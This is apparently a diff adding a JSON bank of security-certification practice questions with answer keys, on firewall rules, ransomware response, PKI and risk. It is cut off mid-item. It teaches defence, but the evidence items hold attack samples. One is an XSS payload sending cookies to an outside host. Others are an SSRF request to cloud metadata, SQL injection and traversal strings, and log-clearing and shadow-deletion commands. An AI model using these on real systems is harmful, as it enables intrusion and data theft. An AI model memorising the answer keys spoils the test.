@@ -1,0 +1,1291 @@
+[
+ {
+  "id": "pbq-fw-order",
+  "type": "order",
+  "t": "Firewall rules",
+  "title": "Rebuild the firewall rule set",
+  "prompt": "Requirements: (1) Only HR (10.10.30.0/24) may reach the payroll server 10.10.20.15 on HTTPS. (2) Every other server in 10.10.20.0/24 must accept HTTPS from anywhere. (3) Admins in 10.10.5.0/24 may SSH to payroll, except the contractor at 10.10.5.77. (4) Internal hosts may query DNS at 10.10.1.10. (5) Everything else is blocked and logged. Put the rules in the correct order and set each action. Rules are processed top-down, first match wins.",
+  "items": [
+   {
+    "text": "TCP 10.10.30.0/24 → 10.10.20.15 : 443",
+    "act": "PERMIT"
+   },
+   {
+    "text": "TCP any → 10.10.20.15 : 443",
+    "act": "DENY"
+   },
+   {
+    "text": "TCP any → 10.10.20.0/24 : 443",
+    "act": "PERMIT"
+   },
+   {
+    "text": "TCP 10.10.5.77 → 10.10.20.15 : 22",
+    "act": "DENY"
+   },
+   {
+    "text": "TCP 10.10.5.0/24 → 10.10.20.15 : 22",
+    "act": "PERMIT"
+   },
+   {
+    "text": "UDP 10.10.0.0/16 → 10.10.1.10 : 53",
+    "act": "PERMIT"
+   },
+   {
+    "text": "IP any → any : any (log)",
+    "act": "DENY"
+   }
+  ],
+  "actions": [
+   "PERMIT",
+   "DENY"
+  ],
+  "constraints": [
+   [
+    0,
+    1
+   ],
+   [
+    1,
+    2
+   ],
+   [
+    3,
+    4
+   ],
+   [
+    0,
+    6
+   ],
+   [
+    1,
+    6
+   ],
+   [
+    2,
+    6
+   ],
+   [
+    3,
+    6
+   ],
+   [
+    4,
+    6
+   ],
+   [
+    5,
+    6
+   ]
+  ],
+  "why": "Specific rules go above the broad rules they overlap: HR permit above the payroll deny, the payroll deny above the subnet-wide permit, and the contractor deny above the admin permit. The logged deny-all goes last."
+ },
+ {
+  "id": "pbq-fw-trace",
+  "type": "match",
+  "t": "Firewall rules",
+  "title": "Trace traffic through the ACL",
+  "prompt": "For each flow, choose what happens. There is no rule after rule 6.",
+  "exhibit": "#  Action  Proto  Source            Destination       Port\n1  PERMIT  TCP    172.16.10.0/24    any               80,443\n2  DENY    TCP    172.16.10.66      any               any\n3  PERMIT  TCP    any               172.16.50.10      25\n4  PERMIT  UDP    172.16.0.0/16     172.16.1.53       53\n5  DENY    TCP    any               172.16.50.0/24    any   (log)\n6  PERMIT  TCP    172.16.20.0/24    172.16.50.0/24    3389",
+  "choices": [
+   "Allowed by rule 1",
+   "Denied by rule 2",
+   "Allowed by rule 3",
+   "Allowed by rule 4",
+   "Denied by rule 5",
+   "Allowed by rule 6",
+   "Denied by implicit deny"
+  ],
+  "rows": [
+   {
+    "label": "172.16.10.66 → 8.8.8.8, TCP 443",
+    "a": "Allowed by rule 1"
+   },
+   {
+    "label": "172.16.10.66 → 172.16.50.20, TCP 22",
+    "a": "Denied by rule 2"
+   },
+   {
+    "label": "203.0.113.9 → 172.16.50.10, TCP 25",
+    "a": "Allowed by rule 3"
+   },
+   {
+    "label": "172.16.20.5 → 172.16.50.30, TCP 3389",
+    "a": "Denied by rule 5"
+   },
+   {
+    "label": "172.16.30.9 → 172.16.1.53, UDP 53",
+    "a": "Allowed by rule 4"
+   },
+   {
+    "label": "172.16.30.9 → 172.16.1.53, TCP 53",
+    "a": "Denied by implicit deny"
+   }
+  ],
+  "why": ".66 hits rule 1 first for 443, so rule 2 only catches its other ports. Rule 5 shadows rule 6, so RDP to 172.16.50.0/24 never reaches the permit. TCP 53 matches nothing and falls to implicit deny."
+ },
+ {
+  "id": "pbq-ir-order",
+  "type": "order",
+  "t": "Ransomware IR",
+  "title": "Order the ransomware response",
+  "prompt": "Ransomware is spreading from WS-HR-112 to file server FS-02 using the stolen svc_backup account. Put the actions in the order they should happen.",
+  "items": [
+   {
+    "text": "Confirm the alerts and scope which hosts and accounts are affected"
+   },
+   {
+    "text": "Isolate WS-HR-112 and FS-02 with EDR and disable svc_backup"
+   },
+   {
+    "text": "Capture memory from WS-HR-112"
+   },
+   {
+    "text": "Remove persistence and close the entry point"
+   },
+   {
+    "text": "Restore FS-02 from clean, verified backups"
+   },
+   {
+    "text": "Monitor restored systems closely for reinfection"
+   },
+   {
+    "text": "Hold the lessons-learned review and update playbooks"
+   }
+  ],
+  "constraints": [
+   [
+    0,
+    1
+   ],
+   [
+    0,
+    2
+   ],
+   [
+    1,
+    3
+   ],
+   [
+    2,
+    3
+   ],
+   [
+    3,
+    4
+   ],
+   [
+    4,
+    5
+   ],
+   [
+    5,
+    6
+   ]
+  ],
+  "why": "Analysis, then containment, with memory captured before anything is wiped. Eradication comes before recovery, recovery is monitored, and lessons learned comes last."
+ },
+ {
+  "id": "pbq-ir-logs",
+  "type": "match",
+  "t": "Ransomware IR",
+  "title": "Read the attack timeline",
+  "prompt": "Classify each log entry, then choose the best containment action at 02:33.",
+  "exhibit": "01:12  WS-HR-112  WINWORD.EXE → powershell.exe -nop -w hidden -enc SQBFAFgA...\n01:40  DC-01      4625 ×312 for svc_backup from WS-HR-112, then 4624 success\n02:09  FS-02      PsExec service installed, launched from WS-HR-112\n02:18  FS-02      rclone.exe → 185.220.101.47, 4.8 GB outbound\n02:29  FS-02      wevtutil cl Security\n02:31  FS-02      vssadmin delete shadows /all /quiet",
+  "choices": [
+   "Initial access",
+   "Credential access",
+   "Lateral movement",
+   "Exfiltration",
+   "Defense evasion",
+   "Inhibit recovery"
+  ],
+  "rows": [
+   {
+    "label": "01:12 Word spawns encoded PowerShell",
+    "a": "Initial access"
+   },
+   {
+    "label": "01:40 312 failures, then success",
+    "a": "Credential access"
+   },
+   {
+    "label": "02:09 PsExec from the workstation",
+    "a": "Lateral movement"
+   },
+   {
+    "label": "02:18 rclone, 4.8 GB out",
+    "a": "Exfiltration"
+   },
+   {
+    "label": "02:29 wevtutil cl Security",
+    "a": "Defense evasion"
+   },
+   {
+    "label": "02:31 vssadmin delete shadows",
+    "a": "Inhibit recovery"
+   },
+   {
+    "label": "Best action at 02:33",
+    "a": "Isolate both hosts with EDR and disable svc_backup",
+    "choices": [
+     "Isolate both hosts with EDR and disable svc_backup",
+     "Block 185.220.101.47 and keep monitoring",
+     "Power off every server in the data center",
+     "Reimage WS-HR-112 immediately"
+    ]
+   }
+  ],
+  "why": "Deleting shadow copies right after exfiltration means encryption is minutes away. Containment must cover every host and the stolen credential while keeping memory for forensics."
+ },
+ {
+  "id": "pbq-wifi-auth",
+  "type": "match",
+  "t": "Wireless",
+  "title": "Match each wireless requirement",
+  "prompt": "Choose the best configuration for each network.",
+  "choices": [
+   "EAP-TLS",
+   "PEAP",
+   "EAP-TTLS",
+   "WPA3-Personal (SAE)",
+   "Enhanced Open (OWE)",
+   "Captive portal",
+   "WPA3-Enterprise 192-bit"
+  ],
+  "rows": [
+   {
+    "label": "Clinical tablets authenticate with device certificates; no passwords; revoke devices one at a time",
+    "a": "EAP-TLS"
+   },
+   {
+    "label": "Staff laptops use existing AD passwords; only the RADIUS server has a certificate",
+    "a": "PEAP"
+   },
+   {
+    "label": "Small branch uses one shared passphrase that must resist offline cracking",
+    "a": "WPA3-Personal (SAE)"
+   },
+   {
+    "label": "Lobby Wi-Fi must be encrypted but needs no password",
+    "a": "Enhanced Open (OWE)"
+   },
+   {
+    "label": "Guests must accept terms before getting internet access",
+    "a": "Captive portal"
+   },
+   {
+    "label": "Legacy devices need PAP inside a TLS tunnel",
+    "a": "EAP-TTLS"
+   },
+   {
+    "label": "Classified lab requires the CNSA-grade suite",
+    "a": "WPA3-Enterprise 192-bit"
+   }
+  ],
+  "why": "Certificates on both sides is EAP-TLS. A server cert plus a password inside the tunnel is PEAP, and TTLS supports legacy inner methods. SAE stops offline cracking, OWE encrypts open networks, and a captive portal handles terms."
+ },
+ {
+  "id": "pbq-access-models",
+  "type": "match",
+  "t": "Access control",
+  "title": "Identify the access control approach",
+  "prompt": "Match each scenario to the model or principle it describes.",
+  "choices": [
+   "Discretionary (DAC)",
+   "Mandatory (MAC)",
+   "Role-based (RBAC)",
+   "Attribute-based (ABAC)",
+   "Rule-based",
+   "Separation of duties",
+   "Least privilege"
+  ],
+  "rows": [
+   {
+    "label": "A file's owner decides who can open it",
+    "a": "Discretionary (DAC)"
+   },
+   {
+    "label": "Clearance labels are enforced by the system; users can't change them",
+    "a": "Mandatory (MAC)"
+   },
+   {
+    "label": "All tellers get the same rights through the Teller group",
+    "a": "Role-based (RBAC)"
+   },
+   {
+    "label": "Access only for Finance users on managed devices in the U.S.",
+    "a": "Attribute-based (ABAC)"
+   },
+   {
+    "label": "Every login is blocked from 10 PM to 6 AM for everyone",
+    "a": "Rule-based"
+   },
+   {
+    "label": "The person who creates a vendor can't approve its payments",
+    "a": "Separation of duties"
+   },
+   {
+    "label": "A help desk tech gets password-reset rights but not admin rights",
+    "a": "Least privilege"
+   }
+  ],
+  "why": "Owner decides = DAC; labels = MAC; job role = RBAC; many attributes = ABAC; one system-wide rule = rule-based."
+ },
+ {
+  "id": "pbq-vuln-priority",
+  "type": "order",
+  "t": "Vulnerability mgmt",
+  "title": "Prioritize the scan findings",
+  "prompt": "Order these findings from first to fix to last. Consider exposure and exploitation, not just the CVSS number.",
+  "items": [
+   {
+    "text": "CVSS 9.8 RCE on the internet-facing VPN appliance, listed in CISA KEV"
+   },
+   {
+    "text": "CVSS 8.1 on an internal file server, public exploit available"
+   },
+   {
+    "text": "CVSS 6.5 on the public website, no known exploit"
+   },
+   {
+    "text": "CVSS 9.0 on an isolated lab VM with no network connection"
+   },
+   {
+    "text": "CVSS 4.3 information disclosure on a branch printer"
+   }
+  ],
+  "constraints": [
+   [
+    0,
+    1
+   ],
+   [
+    0,
+    2
+   ],
+   [
+    0,
+    3
+   ],
+   [
+    1,
+    3
+   ],
+   [
+    2,
+    4
+   ]
+  ],
+  "why": "Actively exploited and internet-facing comes first. An isolated lab box ranks low despite its 9.0 because nothing can reach it."
+ },
+ {
+  "id": "pbq-dns-email",
+  "type": "match",
+  "t": "DNS & email security",
+  "title": "Pick the DNS or email control",
+  "prompt": "Match each requirement to the best control.",
+  "choices": [
+   "SPF",
+   "DKIM",
+   "DMARC",
+   "DNSSEC",
+   "MTA-STS",
+   "DANE",
+   "DNS over HTTPS"
+  ],
+  "rows": [
+   {
+    "label": "Publish which servers may send mail for the domain",
+    "a": "SPF"
+   },
+   {
+    "label": "Sign outgoing mail so receivers can verify it wasn't altered",
+    "a": "DKIM"
+   },
+   {
+    "label": "Tell receivers to reject mail that fails alignment, and send reports",
+    "a": "DMARC"
+   },
+   {
+    "label": "Let resolvers verify A records weren't forged",
+    "a": "DNSSEC"
+   },
+   {
+    "label": "Require TLS for inbound mail without deploying DNSSEC",
+    "a": "MTA-STS"
+   },
+   {
+    "label": "Pin the mail server's certificate in DNS (requires DNSSEC)",
+    "a": "DANE"
+   },
+   {
+    "label": "Encrypt employees' DNS queries to the resolver",
+    "a": "DNS over HTTPS"
+   }
+  ],
+  "why": "SPF lists senders, DKIM signs, DMARC sets policy. DNSSEC signs records, DANE uses them to pin certs, MTA-STS uses HTTPS instead, and DoH encrypts queries."
+ },
+ {
+  "id": "pbq-placement",
+  "type": "match",
+  "t": "Control placement",
+  "title": "Place the security devices",
+  "prompt": "A hospital network. Choose what belongs at each location, then pick two settings.",
+  "exhibit": "Internet ─[L1]─ Perimeter FW ─[L2]─[L3]─ Web servers (DMZ)\n                     │\n               Internal FW ─[L4]─ Core switch ─(mirror port)─[L5]\n                                   │\n                     Mgmt VLAN [L6]     User access ports [L7]",
+  "choices": [
+   "No device here",
+   "WAF",
+   "Load balancer",
+   "IPS",
+   "IDS",
+   "Jump server",
+   "NAC (802.1X)"
+  ],
+  "rows": [
+   {
+    "label": "L1",
+    "a": "No device here"
+   },
+   {
+    "label": "L2",
+    "a": "WAF"
+   },
+   {
+    "label": "L3",
+    "a": "Load balancer"
+   },
+   {
+    "label": "L4 (must block automatically)",
+    "a": "IPS"
+   },
+   {
+    "label": "L5 (visibility, no latency)",
+    "a": "IDS"
+   },
+   {
+    "label": "L6",
+    "a": "Jump server"
+   },
+   {
+    "label": "L7",
+    "a": "NAC (802.1X)"
+   },
+   {
+    "label": "IPS failure mode (patient care must continue)",
+    "a": "Fail-open",
+    "choices": [
+     "Fail-open",
+     "Fail-closed"
+    ]
+   },
+   {
+    "label": "Load balancing (sessions live in one server's memory)",
+    "a": "Sticky sessions",
+    "choices": [
+     "Sticky sessions",
+     "Round-robin",
+     "Active-passive"
+    ]
+   }
+  ],
+  "why": "A WAF outside the perimeter firewall would be unprotected, so L1 stays empty. Blocking needs inline (IPS); a mirror port can only feed an IDS. Availability wins in a hospital, so fail-open."
+ },
+ {
+  "id": "pbq-resilience",
+  "type": "match",
+  "t": "Resilience",
+  "title": "Match the resilience control",
+  "prompt": "Choose the control that meets each requirement.",
+  "choices": [
+   "Hot site",
+   "Warm site",
+   "Cold site",
+   "Journaling + point-in-time restore",
+   "Synchronous replication",
+   "Immutable offsite backups",
+   "UPS",
+   "Generator"
+  ],
+  "rows": [
+   {
+    "label": "Take over within minutes after losing the primary site",
+    "a": "Hot site"
+   },
+   {
+    "label": "Cheapest option; weeks to recover is acceptable",
+    "a": "Cold site"
+   },
+   {
+    "label": "Hardware ready, but data must be loaded first",
+    "a": "Warm site"
+   },
+   {
+    "label": "Recover the database to any specific minute",
+    "a": "Journaling + point-in-time restore"
+   },
+   {
+    "label": "No data loss if the primary storage array dies",
+    "a": "Synchronous replication"
+   },
+   {
+    "label": "Survive ransomware run by an attacker with domain admin",
+    "a": "Immutable offsite backups"
+   },
+   {
+    "label": "Bridge the 30 seconds before backup power starts",
+    "a": "UPS"
+   },
+   {
+    "label": "Run for three days without utility power",
+    "a": "Generator"
+   }
+  ],
+  "why": "Replication protects against hardware loss but copies corruption; journaling rewinds. Only backups an attacker can't change survive ransomware."
+ },
+ {
+  "id": "pbq-cloud-resp",
+  "type": "match",
+  "t": "Cloud & virtualization",
+  "title": "Shared responsibility",
+  "prompt": "Who is responsible for each task?",
+  "choices": [
+   "Customer",
+   "Cloud provider"
+  ],
+  "rows": [
+   {
+    "label": "IaaS: patching the guest operating system",
+    "a": "Customer"
+   },
+   {
+    "label": "IaaS: physical security of the hosts",
+    "a": "Cloud provider"
+   },
+   {
+    "label": "PaaS: vulnerabilities in the customer's application code",
+    "a": "Customer"
+   },
+   {
+    "label": "PaaS: patching the runtime and underlying OS",
+    "a": "Cloud provider"
+   },
+   {
+    "label": "SaaS: managing user accounts and MFA",
+    "a": "Customer"
+   },
+   {
+    "label": "SaaS: patching the application",
+    "a": "Cloud provider"
+   },
+   {
+    "label": "Any model: classifying the data stored in the service",
+    "a": "Customer"
+   },
+   {
+    "label": "IaaS: setting storage bucket access permissions",
+    "a": "Customer"
+   }
+  ],
+  "why": "The provider always owns the physical layer; the customer always owns its data, identities, and its own configuration choices."
+ },
+ {
+  "id": "pbq-protocols",
+  "type": "match",
+  "t": "Network security",
+  "title": "Replace insecure protocols",
+  "prompt": "Choose the secure replacement and its default port.",
+  "choices": [
+   "SSH (22)",
+   "SFTP (22)",
+   "LDAPS (636)",
+   "HTTPS (443)",
+   "SNMPv3 (161)",
+   "Syslog over TLS (6514)",
+   "IMAPS (993)",
+   "POP3S (995)"
+  ],
+  "rows": [
+   {
+    "label": "Telnet for router management",
+    "a": "SSH (22)"
+   },
+   {
+    "label": "FTP for file transfers",
+    "a": "SFTP (22)"
+   },
+   {
+    "label": "LDAP on 389 for directory lookups",
+    "a": "LDAPS (636)"
+   },
+   {
+    "label": "HTTP for the member portal",
+    "a": "HTTPS (443)"
+   },
+   {
+    "label": "SNMPv2c community strings",
+    "a": "SNMPv3 (161)"
+   },
+   {
+    "label": "Syslog on UDP 514",
+    "a": "Syslog over TLS (6514)"
+   },
+   {
+    "label": "IMAP on 143",
+    "a": "IMAPS (993)"
+   },
+   {
+    "label": "POP3 on 110",
+    "a": "POP3S (995)"
+   }
+  ],
+  "why": "SFTP rides on SSH at 22; LDAPS is 636; secure syslog is 6514; IMAPS 993 and POP3S 995."
+ },
+ {
+  "id": "pbq-web-attacks",
+  "type": "match",
+  "t": "Web attacks",
+  "title": "Identify the attack from the evidence",
+  "prompt": "Match each piece of evidence to the attack.",
+  "choices": [
+   "Reflected XSS",
+   "SSRF",
+   "SQL injection",
+   "Directory traversal",
+   "CSRF",
+   "SYN flood",
+   "ARP poisoning"
+  ],
+  "rows": [
+   {
+    "label": "GET /search?q=<script>new Image().src='//x.io/?c='+document.cookie</script>",
+    "a": "Reflected XSS"
+   },
+   {
+    "label": "POST /avatar url=http://169.254.169.254/latest/meta-data/iam/",
+    "a": "SSRF"
+   },
+   {
+    "label": "GET /account?id=1' OR '1'='1",
+    "a": "SQL injection"
+   },
+   {
+    "label": "GET /download?file=../../../../etc/passwd",
+    "a": "Directory traversal"
+   },
+   {
+    "label": "Forum post: <img src=\"https://bank.example/transfer?to=88&amt=4900\">",
+    "a": "CSRF"
+   },
+   {
+    "label": "Thousands of half-open TCP connections from spoofed IPs",
+    "a": "SYN flood"
+   },
+   {
+    "label": "Many hosts' ARP tables now map the gateway IP to one laptop's MAC",
+    "a": "ARP poisoning"
+   }
+  ],
+  "why": "Script reading cookies = XSS; the server fetching an internal URL = SSRF; the victim's browser sending a request = CSRF; ../ on disk paths = traversal."
+ },
+ {
+  "id": "pbq-social",
+  "type": "match",
+  "t": "Social engineering",
+  "title": "Name the technique",
+  "prompt": "Choose the MOST specific answer for each scenario.",
+  "choices": [
+   "Pretexting",
+   "Smishing",
+   "Business email compromise",
+   "Whaling",
+   "Watering hole",
+   "Typosquatting",
+   "Evil twin"
+  ],
+  "rows": [
+   {
+    "label": "A caller quotes a real outage ticket number; what made the call believable?",
+    "a": "Pretexting"
+   },
+   {
+    "label": "A text says the member's account is locked and links to a login page",
+    "a": "Smishing"
+   },
+   {
+    "label": "A real vendor mailbox asks AP to change the vendor's bank account",
+    "a": "Business email compromise"
+   },
+   {
+    "label": "A phishing email is crafted specifically for the CFO",
+    "a": "Whaling"
+   },
+   {
+    "label": "An industry forum staff visit daily is compromised to serve malware",
+    "a": "Watering hole"
+   },
+   {
+    "label": "Attackers register exmaple-cu.org",
+    "a": "Typosquatting"
+   },
+   {
+    "label": "Same SSID, stronger signal, and a deauthentication flood",
+    "a": "Evil twin"
+   }
+  ],
+  "why": "Each answer is the most specific term: the story is pretexting, a compromised business mailbox is BEC, and a cloned SSID is an evil twin, not just a rogue AP."
+ },
+ {
+  "id": "pbq-indicators",
+  "type": "match",
+  "t": "Indicators",
+  "title": "Name the indicator",
+  "prompt": "Match each observation to the indicator it represents.",
+  "choices": [
+   "Impossible travel",
+   "Concurrent session usage",
+   "Account lockout",
+   "Missing logs",
+   "Out-of-cycle logging",
+   "Resource consumption",
+   "Blocked content",
+   "Published/documented"
+  ],
+  "rows": [
+   {
+    "label": "Login from Phoenix, then Singapore 25 minutes later",
+    "a": "Impossible travel"
+   },
+   {
+    "label": "One VPN account active from Denver and Aurora at the same time",
+    "a": "Concurrent session usage"
+   },
+   {
+    "label": "40 users locked out within ten minutes",
+    "a": "Account lockout"
+   },
+   {
+    "label": "No Security log entries from 01:00 to 01:40 on a running DC",
+    "a": "Missing logs"
+   },
+   {
+    "label": "Backup jobs run at 2 PM instead of 2 AM, no change ticket",
+    "a": "Out-of-cycle logging"
+   },
+   {
+    "label": "A workstation sends 30 GB outbound overnight",
+    "a": "Resource consumption"
+   },
+   {
+    "label": "The proxy keeps blocking one host from a known malware domain",
+    "a": "Blocked content"
+   },
+   {
+    "label": "Member records appear for sale on a leak site",
+    "a": "Published/documented"
+   }
+  ],
+  "why": "Check the clocks before the map: overlap is concurrent use, impossible distance is travel."
+ },
+ {
+  "id": "pbq-mitigations",
+  "type": "match",
+  "t": "Network attacks",
+  "title": "Match the best mitigation",
+  "prompt": "Choose the single best mitigation for each attack.",
+  "choices": [
+   "HttpOnly cookie flag",
+   "Anti-CSRF tokens and SameSite",
+   "IMDSv2 and URL allow-listing",
+   "FIDO2 security keys",
+   "Unique local admin passwords (LAPS)",
+   "Dynamic ARP inspection",
+   "Port security",
+   "802.11w Protected Management Frames"
+  ],
+  "rows": [
+   {
+    "label": "Stored XSS steals session cookies; code fix is weeks away",
+    "a": "HttpOnly cookie flag"
+   },
+   {
+    "label": "Forged transfer requests from other sites",
+    "a": "Anti-CSRF tokens and SameSite"
+   },
+   {
+    "label": "SSRF against the cloud metadata service",
+    "a": "IMDSv2 and URL allow-listing"
+   },
+   {
+    "label": "Reverse-proxy (AiTM) phishing that relays MFA",
+    "a": "FIDO2 security keys"
+   },
+   {
+    "label": "Pass-the-hash between workstations",
+    "a": "Unique local admin passwords (LAPS)"
+   },
+   {
+    "label": "ARP poisoning on the user VLAN",
+    "a": "Dynamic ARP inspection"
+   },
+   {
+    "label": "MAC flooding of the access switch",
+    "a": "Port security"
+   },
+   {
+    "label": "Deauth floods pushing clients to an evil twin",
+    "a": "802.11w Protected Management Frames"
+   }
+  ],
+  "why": "Each mitigation targets exactly how the attack works: script reads cookie, browser sends forged request, server fetches URL, codes get relayed, a hash opens every machine."
+ },
+ {
+  "id": "pbq-certs",
+  "type": "match",
+  "t": "PKI",
+  "title": "Troubleshoot the certificates",
+  "prompt": "Today is 2026-11-15. Identify the problem with each certificate deployment.",
+  "exhibit": "A  vpn.corp.example.com   valid to 2026-10-01   EKU ServerAuth   chain OK\nB  SAN *.corp.example.com  used on a.vpn.corp.example.com   EKU ServerAuth   chain OK\nC  portal.example.com      EKU Code Signing (1.3.6.1.5.5.7.3.3)   chain OK\nD  guest.example.com       issued by internal CA not in phones' trust store\nE  www.example.com         server sends leaf only; intermediate missing\nF  mail.example.com        serial listed on the issuer's CRL (key compromise)\nG  app.example.com         valid to 2027-03-01   SAN matches   EKU ServerAuth   chain OK",
+  "choices": [
+   "Expired",
+   "Name mismatch",
+   "Wrong EKU",
+   "Untrusted issuer",
+   "Missing intermediate",
+   "Revoked",
+   "No problem"
+  ],
+  "rows": [
+   {
+    "label": "Certificate A",
+    "a": "Expired"
+   },
+   {
+    "label": "Certificate B",
+    "a": "Name mismatch"
+   },
+   {
+    "label": "Certificate C",
+    "a": "Wrong EKU"
+   },
+   {
+    "label": "Certificate D",
+    "a": "Untrusted issuer"
+   },
+   {
+    "label": "Certificate E",
+    "a": "Missing intermediate"
+   },
+   {
+    "label": "Certificate F",
+    "a": "Revoked"
+   },
+   {
+    "label": "Certificate G",
+    "a": "No problem"
+   }
+  ],
+  "why": "A wildcard covers exactly one label, so it fails on a.vpn. TLS servers need the Server Authentication EKU. Check dates, name, chain, revocation, then EKU."
+ },
+ {
+  "id": "pbq-controls",
+  "type": "match",
+  "t": "Physical security",
+  "title": "Classify the controls",
+  "prompt": "Choose the control type for the first six rows and the control category for the last four.",
+  "choices": [
+   "Preventive",
+   "Detective",
+   "Corrective",
+   "Deterrent",
+   "Compensating",
+   "Directive"
+  ],
+  "rows": [
+   {
+    "label": "Firewall ACL blocking inbound RDP",
+    "a": "Preventive"
+   },
+   {
+    "label": "SIEM alert on impossible travel",
+    "a": "Detective"
+   },
+   {
+    "label": "Restoring files from backup after an attack",
+    "a": "Corrective"
+   },
+   {
+    "label": "\"Video surveillance in use\" sign",
+    "a": "Deterrent"
+   },
+   {
+    "label": "Isolating an unpatchable legacy system on its own VLAN",
+    "a": "Compensating"
+   },
+   {
+    "label": "Acceptable use policy employees must follow",
+    "a": "Directive"
+   },
+   {
+    "label": "Annual risk assessment process",
+    "a": "Managerial",
+    "choices": [
+     "Technical",
+     "Managerial",
+     "Operational",
+     "Physical"
+    ]
+   },
+   {
+    "label": "Bollards at the branch entrance",
+    "a": "Physical",
+    "choices": [
+     "Technical",
+     "Managerial",
+     "Operational",
+     "Physical"
+    ]
+   },
+   {
+    "label": "Guards' nightly patrol procedure",
+    "a": "Operational",
+    "choices": [
+     "Technical",
+     "Managerial",
+     "Operational",
+     "Physical"
+    ]
+   },
+   {
+    "label": "Full-disk encryption on laptops",
+    "a": "Technical",
+    "choices": [
+     "Technical",
+     "Managerial",
+     "Operational",
+     "Physical"
+    ]
+   }
+  ],
+  "why": "Type is what the control does (prevent, detect, correct, deter, compensate, direct); category is how it's implemented (technical, managerial, operational, physical)."
+ },
+ {
+  "id": "pbq-crypto",
+  "type": "match",
+  "t": "Cryptography",
+  "title": "Pick the cryptographic tool",
+  "prompt": "Choose the best tool for each requirement.",
+  "choices": [
+   "AES-256",
+   "Salted bcrypt",
+   "ECDHE",
+   "SHA-256 hash",
+   "Digital signature",
+   "HSM",
+   "TPM",
+   "Key escrow"
+  ],
+  "rows": [
+   {
+    "label": "Encrypt a 2 TB backup quickly",
+    "a": "AES-256"
+   },
+   {
+    "label": "Store user passwords",
+    "a": "Salted bcrypt"
+   },
+   {
+    "label": "Agree on session keys with perfect forward secrecy",
+    "a": "ECDHE"
+   },
+   {
+    "label": "Detect whether a downloaded file changed",
+    "a": "SHA-256 hash"
+   },
+   {
+    "label": "Prove the CFO approved the document (non-repudiation)",
+    "a": "Digital signature"
+   },
+   {
+    "label": "Protect the CA's signing keys in the data center",
+    "a": "HSM"
+   },
+   {
+    "label": "Store BitLocker keys on each laptop",
+    "a": "TPM"
+   },
+   {
+    "label": "Let a trusted party recover lost encryption keys",
+    "a": "Key escrow"
+   }
+  ],
+  "why": "Symmetric for bulk, slow salted hashing for passwords, ephemeral DH for PFS, signatures for non-repudiation; HSM is the data-center vault, TPM is the laptop chip."
+ },
+ {
+  "id": "pbq-docs-agreements",
+  "type": "match",
+  "t": "Agreements",
+  "title": "Name the document",
+  "prompt": "Match each description to the document type.",
+  "choices": [
+   "SLA",
+   "MOU",
+   "MSA",
+   "SOW",
+   "BPA",
+   "NDA",
+   "Standard",
+   "Guideline",
+   "Procedure"
+  ],
+  "rows": [
+   {
+    "label": "99.95% monthly uptime with service credits",
+    "a": "SLA"
+   },
+   {
+    "label": "Non-binding intent to share threat intelligence",
+    "a": "MOU"
+   },
+   {
+    "label": "Umbrella terms for all future work with a consultancy",
+    "a": "MSA"
+   },
+   {
+    "label": "One project's deliverables, timeline, and cost",
+    "a": "SOW"
+   },
+   {
+    "label": "Two credit unions split a shared branch network's costs and profits",
+    "a": "BPA"
+   },
+   {
+    "label": "Contractor must keep network diagrams confidential",
+    "a": "NDA"
+   },
+   {
+    "label": "\"All laptops use AES-256 full-disk encryption with TPM 2.0\"",
+    "a": "Standard"
+   },
+   {
+    "label": "\"Consider using a password manager\"",
+    "a": "Guideline"
+   },
+   {
+    "label": "\"1. Open BitLocker. 2. Select Turn On…\"",
+    "a": "Procedure"
+   }
+  ],
+  "why": "Partners splitting profit = BPA, not MSA. Named settings = standard; steps = procedure; \"consider\" = guideline."
+ },
+ {
+  "id": "pbq-risk-math",
+  "type": "match",
+  "t": "Risk",
+  "title": "Work the risk numbers",
+  "prompt": "Use the exhibit to answer each part.",
+  "exhibit": "Asset value (AV):          $400,000\nExposure factor (EF):      30%\nAnnual rate (ARO):         0.5\nProposed control:          $25,000 per year; lowers ARO to 0.1",
+  "choices": [],
+  "rows": [
+   {
+    "label": "Single loss expectancy (SLE)",
+    "a": "$120,000",
+    "choices": [
+     "$120,000",
+     "$200,000",
+     "$60,000",
+     "$133,333"
+    ]
+   },
+   {
+    "label": "ALE before the control",
+    "a": "$60,000",
+    "choices": [
+     "$60,000",
+     "$120,000",
+     "$240,000",
+     "$30,000"
+    ]
+   },
+   {
+    "label": "ALE after the control",
+    "a": "$12,000",
+    "choices": [
+     "$12,000",
+     "$6,000",
+     "$40,000",
+     "$48,000"
+    ]
+   },
+   {
+    "label": "Annual value of the control",
+    "a": "$23,000",
+    "choices": [
+     "$23,000",
+     "$48,000",
+     "$35,000",
+     "−$13,000"
+    ]
+   },
+   {
+    "label": "Buying cyber insurance for the rest is which treatment?",
+    "a": "Transfer",
+    "choices": [
+     "Transfer",
+     "Accept",
+     "Avoid",
+     "Mitigate"
+    ]
+   },
+   {
+    "label": "Should the control be bought on cost alone?",
+    "a": "Yes, its value is positive",
+    "choices": [
+     "Yes, its value is positive",
+     "No, it costs more than it saves",
+     "Only if ARO drops to zero",
+     "Not enough information"
+    ]
+   }
+  ],
+  "why": "SLE = 400,000 × 0.3 = 120,000. ALE = 120,000 × 0.5 = 60,000, then × 0.1 = 12,000. Value = 60,000 − 12,000 − 25,000 = 23,000."
+ },
+ {
+  "id": "pbq-vendor-roles",
+  "type": "match",
+  "t": "Vendor management",
+  "title": "Vendors and data roles",
+  "prompt": "Match each description to the correct term.",
+  "choices": [
+   "Right-to-audit clause",
+   "Supply chain analysis",
+   "Independent assessment",
+   "Vendor monitoring",
+   "Data owner",
+   "Data custodian",
+   "Data processor",
+   "Data controller"
+  ],
+  "rows": [
+   {
+    "label": "Contract term letting you inspect the vendor after signing",
+    "a": "Right-to-audit clause"
+   },
+   {
+    "label": "Checking where a vendor's chips and firmware come from before award",
+    "a": "Supply chain analysis"
+   },
+   {
+    "label": "Vendor provides a SOC 2 Type II from a CPA firm",
+    "a": "Independent assessment"
+   },
+   {
+    "label": "Tracking the vendor's security rating every quarter",
+    "a": "Vendor monitoring"
+   },
+   {
+    "label": "Business manager accountable for classifying loan data",
+    "a": "Data owner"
+   },
+   {
+    "label": "IT team that runs backups and encryption as instructed",
+    "a": "Data custodian"
+   },
+   {
+    "label": "Payroll company that processes employee data on your instructions",
+    "a": "Data processor"
+   },
+   {
+    "label": "Organization that decides why and how personal data is processed",
+    "a": "Data controller"
+   }
+  ],
+  "why": "Right-to-audit happens after signing; supply chain analysis looks at sub-suppliers before. Owners decide, custodians implement, controllers set purpose, processors follow instructions."
+ },
+ {
+  "id": "pbq-privacy",
+  "type": "match",
